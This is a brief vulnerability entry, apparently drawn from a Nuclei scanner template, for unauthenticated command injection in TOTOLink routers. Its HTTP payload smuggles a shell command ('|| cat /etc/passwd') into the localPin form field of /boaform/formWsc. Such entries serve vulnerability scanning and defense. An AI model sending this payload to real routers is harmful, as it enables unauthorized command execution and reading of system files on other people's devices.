# Vulnerability: TOTOLink Router - Remote Command Execution
**Classification:** CWE-78
**Source:** Nuclei Template (`totolink-boaform-rce.yaml`)

## Description
TOTOLink routers are vulnerable to unauthenticated remote command execution via the /boaform/formWsc endpoint. An attacker can inject OS commands through the localPin parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST /boaform/formWsc HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

targetAPMac=001A2B3C4D5E&targetAPSsid=3232&submit-url=aaaaaa&localPin=aaaa%20||%20cat%20/etc/passwd
```

